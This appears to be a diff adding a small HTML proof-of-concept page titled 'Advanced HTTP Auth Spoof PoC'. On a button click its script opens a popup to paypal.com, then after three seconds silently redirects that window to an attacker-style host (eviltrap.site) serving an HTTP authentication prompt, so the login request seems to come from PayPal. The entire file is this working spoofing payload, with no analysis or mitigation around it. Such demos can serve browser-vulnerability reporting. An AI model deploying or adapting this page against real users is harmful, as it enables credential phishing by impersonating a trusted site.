@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced HTTP Auth Spoof PoC</title>
+</head>
+<body>
+    <button id="trigger">Click Me</button>
+
+    <script>
+        document.getElementById('trigger').addEventListener('click', () => {
+            let win = window.open('https://paypal.com', 'authSpoof', 'width=800,height=600');
+            setTimeout(() => {
+                win.location.href = 'https://eviltrap.site/trap/http-auth-prompt-spoof/auth';
+            }, 3000);
+        });
+    </script>
+</body>
+</html>
